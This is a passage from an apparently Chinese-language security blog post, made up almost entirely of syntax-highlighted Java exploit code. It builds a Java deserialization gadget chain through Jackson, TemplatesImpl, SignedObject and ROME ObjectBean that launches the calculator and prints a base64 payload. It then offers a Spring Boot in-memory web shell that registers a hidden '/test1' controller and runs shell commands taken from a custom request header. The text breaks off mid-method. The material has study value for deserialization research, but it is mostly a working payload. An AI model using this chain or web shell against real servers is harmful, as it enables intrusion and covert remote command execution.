        <span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> cc <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"org.example.jackson.demos.web.Calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> cc2 <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cc<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>cc2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.fasterxml.jackson.databind.node.BaseJsonNode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtMethod</span> writeReplace <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"writeReplace"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ctClass<span class="token punctuation">.</span><span class="token function">removeMethod</span><span class="token punctuation">(</span>writeReplace<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 将修改后的CtClass加载至当前线程的上下文类加载器中</span>
        ctClass<span class="token punctuation">.</span><span class="token function">toClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtConstructor</span> constructor <span class="token operator">=</span> <span class="token class-name">CtNewConstructor</span><span class="token punctuation">.</span><span class="token function">make</span><span class="token punctuation">(</span><span class="token string">"public A()&#123;Runtime.getRuntime().exec(\"calc\");&#125;"</span><span class="token punctuation">,</span>cc<span class="token punctuation">)</span><span class="token punctuation">;</span>
        cc<span class="token punctuation">.</span><span class="token function">addConstructor</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bttes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>cc<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

        <span class="token class-name">TemplatesImpl</span> templateImpl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setValue</span><span class="token punctuation">(</span>templateImpl<span class="token punctuation">,</span><span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setValue</span><span class="token punctuation">(</span>templateImpl<span class="token punctuation">,</span><span class="token string">"_bytecodes"</span><span class="token punctuation">,</span>bttes<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setValue</span><span class="token punctuation">(</span>templateImpl<span class="token punctuation">,</span><span class="token string">"_tfactory"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectMapper</span> objmapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ArrayNode</span> arrayNode <span class="token operator">=</span>objmapper<span class="token punctuation">.</span><span class="token function">createArrayNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        arrayNode<span class="token punctuation">.</span><span class="token function">addPOJO</span><span class="token punctuation">(</span>templateImpl<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">BadAttributeValueExpException</span> badAttributeValueExpException <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Field</span> field <span class="token operator">=</span> badAttributeValueExpException<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">,</span>arrayNode<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//        serialize(badAttributeValueExpException);</span>
<span class="token comment">//        unserialize("set23.bin");</span>
        <span class="token class-name">KeyPairGenerator</span> kpg <span class="token operator">=</span> <span class="token class-name">KeyPairGenerator</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DSA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        kpg<span class="token punctuation">.</span><span class="token function">initialize</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">KeyPair</span> kp <span class="token operator">=</span> kpg<span class="token punctuation">.</span><span class="token function">generateKeyPair</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">SignedObject</span> signedObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SignedObject</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">,</span> kp<span class="token punctuation">.</span><span class="token function">getPrivate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Signature</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DSA"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectBean</span> bean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectBean</span><span class="token punctuation">(</span><span class="token class-name">ObjectBean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">ObjectBean</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token string">"rand"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">HashSet</span> hashSet <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hashSet<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>bean<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectBean</span> exp <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ObjectBean</span><span class="token punctuation">(</span><span class="token class-name">SignedObject</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>signedObject<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setValue1</span><span class="token punctuation">(</span>bean<span class="token punctuation">,</span><span class="token string">"_equalsBean"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">EqualsBean</span><span class="token punctuation">(</span><span class="token class-name">ObjectBean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>exp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">serialize</span><span class="token punctuation">(</span>hashSet<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> a <span class="token operator">=</span> <span class="token function">encodeFileToBase64</span><span class="token punctuation">(</span><span class="token string">"set23.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token string">"set23.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> file<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> object <span class="token operator">=</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ois<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> object<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"set23.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span>  <span class="token keyword">static</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token keyword">void</span> <span class="token function">setValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span><span class="token class-name">String</span> name<span class="token punctuation">,</span><span class="token class-name">T</span> f<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">Field</span> filed <span class="token operator">=</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
        filed<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        filed<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">encodeFileToBase64</span><span class="token punctuation">(</span><span class="token class-name">String</span> filePath<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">File</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">(</span><span class="token class-name">FileInputStream</span> fileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> fileBytes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> file<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            fileInputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>fileBytes<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 读取文件字节内容</span>
            <span class="token keyword">return</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>fileBytes<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Base64 编码</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setValue1</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">Field</span> field <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这是弹计算器的，动态加载字节码的地方换成内存马就行了。内存马如下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">gadget<span class="token punctuation">.</span>memshell</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">WebApplicationContext</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span>request<span class="token punctuation">.</span></span><span class="token class-name">RequestContextHolder</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span>request<span class="token punctuation">.</span></span><span class="token class-name">ServletRequestAttributes</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>condition<span class="token punctuation">.</span></span><span class="token class-name">PatternsRequestCondition</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>condition<span class="token punctuation">.</span></span><span class="token class-name">RequestMethodsRequestCondition</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>method<span class="token punctuation">.</span></span><span class="token class-name">RequestMappingInfo</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>method<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMappingHandlerMapping</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Scanner</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringBootMemoryShellOfController</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token class-name">Integer</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">SpringBootMemoryShellOfController</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 1. 利用 Spring 内部方法获取 context</span>
        <span class="token class-name">WebApplicationContext</span> context <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">WebApplicationContext</span><span class="token punctuation">)</span> <span class="token class-name">RequestContextHolder</span>
                <span class="token punctuation">.</span><span class="token function">currentRequestAttributes</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 2. 从 context 中获得 RequestMappingHandlerMapping 的实例</span>
        <span class="token class-name">RequestMappingHandlerMapping</span> mappingHandlerMapping <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token class-name">RequestMappingHandlerMapping</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Field</span> configField <span class="token operator">=</span> mappingHandlerMapping<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"config"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        configField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">RequestMappingInfo<span class="token punctuation">.</span>BuilderConfiguration</span> config <span class="token operator">=</span>
                <span class="token punctuation">(</span><span class="token class-name">RequestMappingInfo<span class="token punctuation">.</span>BuilderConfiguration</span><span class="token punctuation">)</span> configField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>mappingHandlerMapping<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 3. 通过反射获得自定义 controller 中的 Method 对象</span>
        <span class="token class-name">Method</span> method <span class="token operator">=</span> <span class="token class-name">SpringBootMemoryShellOfController</span><span class="token punctuation">.</span><span class="token keyword">class</span>
                <span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span> <span class="token class-name">HttpServletRequest</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 在内存中动态注册 controller</span>
        <span class="token class-name">RequestMappingInfo</span> info <span class="token operator">=</span> <span class="token class-name">RequestMappingInfo</span><span class="token punctuation">.</span><span class="token function">paths</span><span class="token punctuation">(</span><span class="token string">"/test1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">options</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">SpringBootMemoryShellOfController</span> springBootMemoryShellOfController <span class="token operator">=</span>
                    <span class="token keyword">new</span> <span class="token class-name">SpringBootMemoryShellOfController</span><span class="token punctuation">(</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            mappingHandlerMapping<span class="token punctuation">.</span><span class="token function">registerMapping</span><span class="token punctuation">(</span>info<span class="token punctuation">,</span> springBootMemoryShellOfController<span class="token punctuation">,</span> method<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
            i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token class-name">SpringBootMemoryShellOfController</span><span class="token punctuation">(</span><span class="token class-name">String</span> test<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"squirt1e"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">boolean</span> isLinux <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token class-name">String</span> osTyp <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"os.name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>osTyp <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> osTyp<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"win"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                isLinux <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cmds <span class="token operator">=</span> isLinux
                    <span class="token operator">?</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
                    <span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"cmd.exe"</span><span class="token punctuation">,</span> <span class="token string">"/c"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
            <span class="token class-name">InputStream</span> in <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmds<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
